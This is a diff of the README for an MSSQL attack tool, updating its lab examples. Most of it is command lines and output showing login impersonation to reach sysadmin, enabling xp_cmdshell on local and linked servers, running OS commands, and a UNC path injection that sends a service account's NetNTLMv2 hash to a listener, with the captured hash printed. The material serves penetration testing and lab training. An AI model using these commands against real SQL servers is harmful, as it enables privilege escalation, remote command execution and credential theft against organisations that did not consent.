@@ -48,7 +48,7 @@ This tool is intended to carry out well-known attacks on MSSQL database servers.
 
 ```
 - [ ] CLI
-```
+```powershell
 Z:\>MSSQLAttacker.exe cli -a
 [-] Invelid AttackName
 [+] Available Attacks
@@ -70,20 +70,20 @@ The sysadmin privilege enables extra functionalities which could be used to gain
 
 - [ ] CLI
 
-```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -u sa -p lab -a getinfo
+```powershell
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a getinfo
 [+] Auth success!
-[+] User: sa
-[+] User is a member of sysadmin role
+[+] User: ROBENSIVELABS\sqluser
+[-] User is NOT a member of sysadmin role
 
 ```
 
 - [ ] C-GUI 
 
-```
+```powershell
 [INPUT] Enter Value: 1
-[+] Logged in as: CORP1\user1
-[-] User is NOT a member of sysadmin role
+[+] User: ROBENSIVELABS\rob
+[+] User is a member of sysadmin role
 ```
 
 #### Check if any user can be impersonated.
@@ -91,18 +91,21 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -u sa -p lab -a getinfo
 
 - [ ] CLI
 
-```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checkimpersonate
+```powershell
+PS C:\Tools> whoami
+robensivelabs\sqluser
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a checkimpersonate
 [+] Auth success!
-[+] Impersonatable Users: sa
+[+] Impersonatable Users:
+ROBENSIVELABS\rob
 
 ```
 
 - [ ] C-GUI 
 
-```
+```powershell
 [INPUT] Enter Value: 3
-[+] Logins that can be impersonated: sa
+[+] Logins that can be impersonated: ROBENSIVELABS\rob
 ```
 
 
@@ -110,12 +113,12 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checkimpersonate
 
 Often linked servers are configured with sysadmin privileges. through which execution of OS command can be performed over the linked server.
 - [ ] CLI
-```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checklinkedservers
+```powershell
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a checklinkedservers
 [+] Auth success!
 [+] Linked Servers:
-APPSRV01
-DC01\SQLEXPRESS
+DBSRV01\SQLEXPRESS
+DC01
 
 ```
 
@@ -124,8 +127,8 @@ DC01\SQLEXPRESS
 ```
 
 [INPUT] Enter Value: 8
-[+] Linked SQL server: APPSRV01
-[+] Linked SQL server: DC01\SQLEXPRESS
+[+] Linked SQL server: DBSRV01\SQLEXPRESS
+[+] Linked SQL server: DC01
 ```
 
 #### Perform UNC Path injection attack.
@@ -133,7 +136,7 @@ The UNC Path Injection attack is well known attack performed over the MSSQL data
 
 - [ ] CLI
 ```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a uncpathinject -l 192.168.49.109
+Z:\>MSSQLAttackerV2-x64.exe cli -t dc01.robensivelabs.local -d master -a uncpathinject -l 192.168.49.109
 [+] Auth success!
 [+] Request Sent to: 192.168.XX.YYY
 
@@ -161,9 +164,9 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 [*] Incoming connection (192.168.00.0,61898)
-[*] AUTHENTICATE_MESSAGE (CORP1\sqlsvc,DC01)
+[*] AUTHENTICATE_MESSAGE (ROBENSIVELABS\sqlsvc,DC01)
 [*] User DC01\sqlsvc authenticated successfully
-[*] sqlsvc::CORP1:aaaaaaaaaaaaaaaa:fd06f750293156da55e662fed63e90d3:0101000000000000002a6de9be95d8017a4bcabd0f4e7ea100000000010010004c007900560044004e00610046007300030010004c007900560044004e006100460073000200100056005000440075006100550076007100040010005600500044007500610055007600710007000800002a6de9be95d80106000400020000000800300030000000000000000000000000300000d5b59bbba756823ee684e0822332d904a879a20075e09a14f9207e27158c27aa0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340039002e003100300039000000000000000000
+[*] sqlsvc::ROBENSIVELABS:aaaaaaaaaaaaaaaa:fd06f750293156da55e662fed63e90d3:0101000000000000002a6de9be95d8017a4bcabd0f4e7ea100000000010010004c007900560044004e00610046007300030010004c007900560044004e006100460073000200100056005000440075006100550076007100040010005600500044007500610055007600710007000800002a6de9be95d80106000400020000000800300030000000000000000000000000300000d5b59bbba756823ee684e0822332d904a879a20075e09a14f9207e27158c27aa0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340039002e003100300039000000000000000000
 [*] Closing down connection (192.168.00.0,61898)
 ```
 
@@ -172,47 +175,52 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 The feature will just identifiy linked server version through banner grabbing which could be very helpful when privileges are low however, version is vulnerable to known exploits.
 
 - [ ] CLI
-```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a checklinkedserverVersion -ls appsrv01
+```powershell
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a checklinkedserverVersion -ls dc01
 [+] Auth success!
-[+] Linked Server: appsrv01
-Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
-        Sep 24 2019 13:48:23
-        Copyright (C) 2019 Microsoft Corporation
-        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+[+] Linked Server: dc01
+Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
+        Oct 20 2015 15:36:27
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
 ```
 
 - [ ] C-GUI 
 
-```
+```powershell
 [INPUT] Enter Value: 9
 Enter Linked Server: APPSRV01
-[+] Linked Server Version: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
-        Sep 24 2019 13:48:23
-        Copyright (C) 2019 Microsoft Corporation
-        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+[+] Linked Server: dc01
+Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
+        Oct 20 2015 15:36:27
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
 ```
 
 #### Toggle xp_cmdshell (Local Server).
 When `sysadmin` privilege is enabled, this feature will reconfigure settings to enable xp_cmdshell which is the easiest way to execute OS commands.
 
 - [ ] CLI
-```bash
+```powershell
 #Fails as current user don't have sysadmin privileges
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell
-[+] Auth success!
-[-] xp_cmdshell enable fail! || Missing Privileges
-
-#Used -impersonateSA to enable impersonation to gain sysadmin priv.
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglecmdshell -impersonateSA
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a togglecmdshell
 [+] Auth success!
 [-] Value In Use: 0
 [-] xp_cmdshell is disabled
+[-] xp_cmdshell toggle fail! || Missing Privileges
+
+#Used -impersonate to enable|toggle impersonation to gain sysadmin priv.
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "robensivelabs\rob" -a togglecmdshell
+[+] Auth success!
+[+] Impersonation Success [robensivelabs\rob]
+[-] Value In Use: 0
+[-] xp_cmdshell is disabled0
 [+] Value In Use: 1
 [+] xp_cmdshell is enabled
 [+] xp_cmdshell toggled
+PS C:\Tools>
 
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglecmdshell -impersonateSA
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "robensivelabs\rob" -a togglecmdshell
 [+] Auth success!
 [-] Value In Use: 1
 [-] xp_cmdshell is enabled
@@ -222,7 +230,7 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglecmdshell -imperso
 
 #Used -impersonateDBO to togle impersonation to gain sysadmin priv.
 
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a enablecmdshell -impersonateDBO -dbo msdb
+Z:\>.\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a enablecmdshell -impersonateDBO -dbo sqladmindb
 [+] Auth success!
 [-] Value In Use: 0
 [-] xp_cmdshell is disabled
@@ -257,6 +265,21 @@ INPUT] Enter Value: 4
 [-] xp_cmdshell is disabled0
 [+] xp_cmdshell toggled
 
+#Through Other User impersonation
+[INPUT] Enter Value: 3
+[+] Impersonatable Users:
+ROBENSIVELABS\rob
+[INPUT] Enter Value: 4
+Enter UserName to impersonate:ROBENSIVELABS\rob
+[+] Impersonation Success [ROBENSIVELABS\rob]
+[INPUT] Enter Value: 1
+[+] User: ROBENSIVELABS\rob
+[INPUT] Enter Value: 6
+[-] Value In Use: 0
+[-] xp_cmdshell is disabled0
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+
 ```
 
 
@@ -267,12 +290,11 @@ The linkedServer might have sysadmin privilege and not the connected database se
 
 - [ ] CLI
 ```batch
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglelinkedcmdshell -ls appsrv01
+PS C:\Tools> .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "ROBENSIVELABS\rob" -a togglelinkedcmdshell -ls dc01
 [+] Auth success!
-[+] Impersonatable Users: sa
-[+] Impersonation Success
-[+] Linked Server: appsrv01      Value In Use: 1
-[-] Linked Server: appsrv01      Value In Use: 0
+[+] Impersonation Success [ROBENSIVELABS\rob]
+[+] Linked Server: dc01  Value In Use: 1
+[-] Linked Server: dc01  Value In Use: 0
 [+] Linked xp_cmdshell toggled
 ```
 
@@ -281,9 +303,9 @@ Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a togglelinkedcmdshell -l
 ```
 
 [INPUT] Enter Value: 10
-Enter Linked Server: APPSRV01
-[-] Linked Server: APPSRV01      Value In Use: 0
-[+] Linked Server: APPSRV01      Value In Use: 1
+Enter Linked Server: dc01
+[-] Linked Server: dc01  Value In Use: 0
+[+] Linked Server: dc01  Value In Use: 1
 [+] Linked xp_cmdshell toggled
 ```
 
@@ -292,24 +314,20 @@ Enter Linked Server: APPSRV01
 - [ ] CLI
 ```bash
 # Fails when no priv
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami
+PS C:\Tools>  .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -a execcmd -c 'whoami'
 [+] Auth success!
-[-] xp_cmdshell enable fail! || Missing Privileges
-# with impersonateSA
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami -impersonateSA
-[+] Auth success!
-[+] Impersonatable Users: sa
-[+] Impersonation Success
-[+] xp_cmdshell enabled
-corp1\sqlsvc
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+[-] Missing Privileges || Ex.Sysadmin
 
-# with impersonate
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd -c whoami -impersonate -iuser sa
+# with dual impersonation rob ==> impersonateSA
+PS C:\Tools>  .\MSSQLAttackerV2-x64.exe cli -t dbsrv01.robensivelabs.local -impersonate -iuser "ROBENSIVELABS\rob" -impersonateSA -a execcmd -c 'whoami'
 [+] Auth success!
-[+] Impersonatable Users: sa
-[+] Impersonation Success
-[+] xp_cmdshell enabled
-corp1\sqlsvc
+[+] Impersonation Success [ROBENSIVELABS\rob]
+[+] Impersonation Success [SA]
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
+nt service\mssql$sqlexpress
 
 # with impersonateDBO
 Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd  -impersonateDBO -dbo msdb -c ipconfig
@@ -333,17 +351,18 @@ Ethernet adapter Ethernet0:
 
 - [ ] C-GUI  when `exit` typed it will close the connection and move to main.
 
-```
+```powershell
 
 [INPUT] Enter Value: 7
-[+] xp_cmdshell enabled
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
 Enter Command: whoami
-corp1\sqlsvc
+nt service\mssql$sqlexpress
 
 Enter Command: hostname
-dc01
+DBSRV01
 
-Enter Command: exit
+Enter Command:
 ```
 
 #### Blind Command Execution LinkedServer (When xp_cmdshell enabled).
@@ -352,7 +371,7 @@ Once xp_cmdshell is enabled over the linkedServer this feature enables `blind` O
 
 - [ ] CLI
 ```c
-Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execlinkedcmd -ls appsrv01 -c "ping 192.168.XX.YY"
+Z:\>MSSQLAttacker.exe cli -t dc01.robensivelabs.local -d master -a execlinkedcmd -ls dc01 -c "ping 192.168.XX.YY"
 [+] Auth success!
 [+] Linked Server: appsrv01      Value In Use: 1
 Command Executed
@@ -360,10 +379,10 @@ Command Executed
 - [ ] C-GUI
 ```c
 [INPUT] Enter Value: 11
-Enter Linked Server: APPSRV01
-[+] Linked xp_cmdshell value_in_use: 1
-Enter Command: ping 192.168.xx.yy
-[+] Command Executed
+Enter Linked Server: DC01
+[+] Linked Server: DC01  Value In Use: 1
+Enter Command: ping 192.168.179.133
+Command Executed
 ```
 #### Custom Query Execution.
 
@@ -372,17 +391,17 @@ Enter Command: ping 192.168.xx.yy
  .\MSSQLAttackerV2.exe cli  -t dc01 -a runCustomQuery -query 'select @@VERSION'
 [+] Auth success!
 select @@VERSION;
-Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
-        Sep 24 2019 13:48:23
-        Copyright (C) 2019 Microsoft Corporation
-        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
+        Oct 20 2015 15:36:27
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
 ```
 - [ ] C-GUI
 ```c
 [INPUT] Enter Value: 12
 Query> select @@VERSION
-Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
-        Sep 24 2019 13:48:23
-        Copyright (C) 2019 Microsoft Corporation
-        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
+Microsoft SQL Server 2012 (SP3) (KB3072779) - 11.0.6020.0 (X64)
+        Oct 20 2015 15:36:27
+        Copyright (c) Microsoft Corporation
+        Express Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)
 ```
